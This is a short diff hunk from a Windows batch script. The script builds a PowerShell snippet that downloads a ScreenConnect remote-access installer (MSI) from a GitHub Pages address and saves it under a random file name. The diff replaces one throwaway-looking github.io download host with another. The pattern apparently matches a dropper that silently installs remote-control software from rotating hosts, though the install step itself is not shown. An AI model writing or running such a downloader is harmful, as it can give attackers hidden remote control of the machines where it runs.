@@ -11,7 +11,7 @@ set "MSI_FILE=%WORK_DIR%\setup_%RANDOM%.msi"
 set "LOG_FILE=%WORK_DIR%\install_log.txt"
 
 (
-echo $url = "https://draylong19281.github.io/ss/ScreenConnect.ClientSetupa.msi"
+echo $url = "https://younlinkg9889.github.io/ee/ScreenConnect.yuttttt.msi"
 echo $path = "%MSI_FILE%"
 echo try {
 echo     $wc = New-Object System.Net.WebClient
